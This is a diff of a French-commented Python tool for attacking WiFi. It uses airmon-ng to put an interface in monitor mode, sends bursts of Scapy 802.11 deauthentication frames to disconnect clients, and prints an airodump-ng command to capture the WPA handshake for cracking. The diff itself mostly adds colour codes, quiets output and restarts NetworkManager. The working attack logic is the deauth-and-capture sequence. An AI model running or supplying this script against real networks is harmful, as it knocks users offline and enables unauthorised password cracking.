@@ -12,6 +12,17 @@ chopper le hash wifi
 
 """
 
+# Setting the color combinations
+RED   = "\033[1;31m"  
+BLUE  = "\033[1;34m"
+CYAN  = "\033[1;36m"
+GREEN = "\033[0;32m"
+RESET = "\033[0;0m"
+BOLD    = "\033[;1m"
+REVERSE = "\033[;7m"
+
+
+
 packet_sniff_timeout = 10
 deauth_packets = 100
 
@@ -36,7 +47,7 @@ def main():
     args = parser.parse_args()
     #verif droit sudo 
     if not os.geteuid() == 0:
-        print("[!] SUDO requied, please make a sudo command")
+        print(GREEN,f"[!] SUDO requied, please make a sudo command")
         sys.exit()
     else:
         pass
@@ -55,10 +66,7 @@ if len(sys.argv) > 2:
     wlanmon = sys.argv[1]
 
 # mode Monitor
-#os.system(f"ifconfig {interface} down")
-#os.system(f"iwconfig {interface} mode monitor")
-#os.system(f"ifconfig {interface} up")
-os.system("airmon-ng check kill")
+os.system("airmon-ng check kill  > /dev/null")
 os.system(f"airmon-ng start {interface} > /dev/null") # > /dev/null pour 0 output
 
 
@@ -112,7 +120,11 @@ if bssid != False:
 
             packet = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=mac, addr3=mac)/Dot11Deauth()
 
-            print(f"[+] DeAuth for MAC : {mac}")
+            print(BLUE,f"[+] DeAuth for MAC : {mac}",RED)
+
+            command = f"airodump-ng --bssid {mac} --channel {channel} {wlanmon}" # essaye de chopper le handshake
+
+            print(command)
 
             sendp(packet, iface=interface, count=deauth_packets, inter=0.1, verbose=1)
 
@@ -129,3 +141,5 @@ else:
 
 # kill monitor mode
 os.system(f"airmon-ng stop {interface} > /dev/null ")
+os.system(f"service NetworkManager restart")
+
